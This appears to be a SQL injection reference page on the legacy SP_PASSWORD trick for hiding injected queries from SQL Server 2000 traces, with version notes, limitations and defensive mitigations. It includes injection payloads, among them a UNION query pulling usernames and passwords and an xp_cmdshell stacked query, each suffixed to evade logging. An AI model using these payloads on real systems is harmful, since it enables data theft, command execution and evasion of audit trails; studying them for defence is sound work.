---
title: SP_PASSWORD (Hiding Query)
description: Using SP_PASSWORD to hide SQL queries in MSSQL logs
category: Advanced Techniques
order: 14
tags: ["sp_password", "log evasion", "query hiding"]
lastUpdated: 2026-10-08
---

The `SP_PASSWORD` technique hid injected queries from SQL Server traces. It abused a feature meant to keep passwords out of SQL Profiler output, and it only works against old servers (SQL Server 2000 and earlier).

## How SP_PASSWORD Works

SQL Server does not write ordinary queries to its error log; statements are recorded by tracing (SQL Profiler, server-side traces, C2 audit mode). In SQL Server 2000 (documented by Chris Anley, 2002; earlier versions likely behaved the same), when the text of a traced event contained the string `sp_password` anywhere, even in a comment, the trace showed this instead of the statement:

```text
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```

The check was a plain string match meant to hide calls such as `sp_password` and `sp_addlogin`. An attacker could therefore append `--sp_password` to any injected query to keep its text out of the trace.

From SQL Server 2005, traces only mask the text of statements that actually handle passwords (for example `CREATE LOGIN ... WITH PASSWORD`, `ALTER LOGIN`, `sp_addlogin`, `sp_password`). A comment containing `sp_password` no longer hides anything: on SQL Server 2017 and 2022 the full text, comment included, appears in `sys.dm_exec_sql_text`, and Extended Events and SQL Server Audit record it too.

## Basic Usage

```sql
-- Normal query (traced as is)
SELECT * FROM users

-- Query with sp_password in a comment (SQL Server 2000: text hidden from the trace)
SELECT * FROM users--sp_password
```

## Practical Applications in SQL Injection

Append `--sp_password` to the payload; the `--` also comments out the rest of the original query. The examples target a string parameter (`'`):

```sql
-- Standard SQL injection
' OR 1=1--

-- Same injection, hidden from SQL Server 2000 traces
' OR 1=1--sp_password

-- UNION attack (two-column host query)
' UNION SELECT username, password FROM users--sp_password

-- Table discovery (two-column host query)
' UNION SELECT table_name, column_name FROM information_schema.columns--sp_password

-- Stacked query with xp_cmdshell (needs sysadmin and xp_cmdshell enabled)
'; EXEC xp_cmdshell 'whoami'--sp_password
```

Variations such as `sp_PassWord` or `sp_pass/**/word` are not useful: the masking matched the literal string `sp_password`, so a variation that slips past a filter also fails to trigger the masking.

## Limitations

1. Only SQL Server 2000 and earlier hide the statement; from 2005 on the comment has no effect on tracing.
2. Even on SQL Server 2000, the query is still visible to application-level logging, network monitoring, database activity monitoring tools and web server logs (for GET parameters).
3. The string `sp_password` in a request is itself a well-known indicator, and WAF rule sets look for it.

## Version Specifics

| SQL Server Version | Behavior                                                                                                           |
| ------------------ | ------------------------------------------------------------------------------------------------------------------ |
| 2000 and earlier   | Any traced statement containing `sp_password` is replaced with a notice                                            |
| 2005 and later     | Only statements that handle passwords are masked; `--sp_password` in a comment is ignored and the text is recorded |

## Detection and Mitigation Strategies

1. Use parameterized queries to prevent SQL injection in the first place.
2. Record statements with Extended Events or SQL Server Audit rather than relying on SQL Trace, which is deprecated.
3. Keep application-level and web server logs independent of the database.
4. Alert on requests containing `sp_password`, since legitimate application traffic rarely does.

For example, an Extended Events session that records every completed batch with its full text (high volume; filter it in production):

```sql
CREATE EVENT SESSION capture_batches ON SERVER
ADD EVENT sqlserver.sql_batch_completed (ACTION (sqlserver.client_app_name, sqlserver.username))
ADD TARGET package0.event_file (SET filename = N'capture_batches');
ALTER EVENT SESSION capture_batches ON SERVER STATE = START;
```

## Historical Context

The technique was widely used against SQL Server 2000 and appears in older SQL injection tools and papers. On current versions it only serves as a detection signature.
